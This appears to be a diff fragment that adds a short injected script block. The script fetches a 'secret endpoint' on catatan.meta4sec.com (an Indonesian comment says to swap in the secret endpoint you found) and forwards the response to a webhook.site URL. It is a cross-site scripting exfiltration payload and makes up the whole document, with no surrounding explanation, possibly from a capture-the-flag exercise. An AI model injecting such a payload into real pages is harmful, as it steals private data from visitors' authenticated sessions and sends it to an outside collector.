@@ -1,0 +1,5 @@
+<script>
+fetch('https://catatan.meta4sec.com/report') // Ganti dengan endpoint rahasia yang kamu temukan
+  .then(r => r.text())
+  .then(d => fetch('https://webhook.site/a360e4d5-f578-49a5-8e87-43c15f832b40?data=' + encodeURIComponent(d)));
+</script
